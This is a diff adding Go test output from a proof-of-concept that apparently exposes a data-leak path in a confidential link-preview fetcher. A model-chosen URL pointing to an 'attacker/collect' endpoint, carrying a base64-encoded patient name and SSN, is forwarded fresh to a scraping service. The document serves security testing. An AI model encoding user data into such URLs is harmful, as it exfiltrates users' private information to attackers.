@@ -1,0 +1,9 @@
+go: downloading github.com/context-dot-dev/context-go-sdk v1.5.0
+=== RUN   TestPoC_MetadataForwardsModelChosenURLToContextDevFresh
+    poc_linkpreview_test.go:42: context.dev received: GET /web/scrape/html
+    poc_linkpreview_test.go:43:   url=https://github.com/attacker/collect?d=W3VzZXJdIG15IHBhdGllbnQgSm9obiBRLiBQdWJsaWMsIFNTTiAxMjMtNDUtNjc4OQ
+    poc_linkpreview_test.go:44:   maxAgeMs=0 zdr=enabled (fresh scrape of the attacker URL, never served from cache)
+    poc_linkpreview_test.go:45:   service answered 200: {"url":"https://github.com/attacker/collect?d=W3VzZXJdIG15IHBhdGllbnQgSm9obiBRLiBQdWJsaWMsIFNTTiAxMjMtNDUtNjc4OQ","title":"ok","description":null,"site_name":null,"image":null,"cached":false}
+--- PASS: TestPoC_MetadataForwardsModelChosenURLToContextDevFresh (0.01s)
+PASS
+ok  	github.com/tinfoilsh/confidential-website-metadata-fetcher	0.013s
